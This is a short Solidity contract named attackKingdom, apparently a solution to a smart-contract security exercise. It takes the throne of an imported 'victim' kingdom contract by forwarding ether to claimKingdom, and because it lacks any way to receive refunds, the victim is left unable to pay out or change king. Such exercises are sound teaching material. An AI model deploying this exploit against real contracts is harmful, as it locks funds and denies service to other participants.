pragma solidity ^0.6.0;
import "./victim.sol";
contract attackKingdom{
    kingdom victimKingdom;
    constructor (address _victimKingdom) public{
        victimKingdom = kingdom(_victimKingdom);
    }
    function attack() public payable{
        victimKingdom.claimKingdom{value : msg.value}();
    }
}